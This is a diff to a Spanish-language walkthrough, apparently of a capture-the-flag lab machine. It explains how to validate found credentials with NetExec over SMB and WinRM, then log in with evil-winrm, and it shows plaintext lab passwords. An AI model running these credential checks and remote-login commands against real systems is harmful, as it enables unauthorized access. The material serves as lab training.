@@ -331,19 +331,31 @@ smbclient //10.129.231.149/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
 Al traernos el archivo y verlo encontramos unas credenciales de un usuario `emily.oscars` y una contraseña `Q!3@Lp#M6b*7t*Vt`
 
 ### Verificación de credenciales validas
-
-Verificamos si estas son correctas
-`nxc smb 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'`
+Con [[CRACKMAPEXEC]] verificamos si estas credenciales son correctas usando los parámetros
+- `smb` para indicar el servicio
+- `-u` para añadir un usuario
+- `-p` para usar contraseña
+```shell
+nxc smb 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
+```
 
 ```ad-hint
 emily.oscars::Q!3@Lp#M6b\*7t\*Vtz
 ```
-La contraseña esta escapada
 
-Verificamos si pertenece al grupo de remote management+
-`nxc winrm 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'`
 
-Vemos que si que pertenece al grupo así que nos conectamos 
+### Validar si el usuario pertenece a Remote Management
+Verificaremos que este usuario pertenece al  grupo de `Remote Management` usando [[CRACKMAPEXEC]] con las opciones
+- `winrm` para usar el servicio WINRM
+- `-u` para pasarle un usuario
+- `-p` para pasarle una contraseña
+```shell
+nxc winrm 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
+```
+
+Vemos que si que pertenece al grupo así que nos conectamos usando [[EVIL_WINRM]] con las opciones
+- `-i` para pasarle la IP
+- `-u` para añadir el usuario
 `evil-winrm  -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'`
 
 Para ver a que grupo pertenecemos ejecutaremos
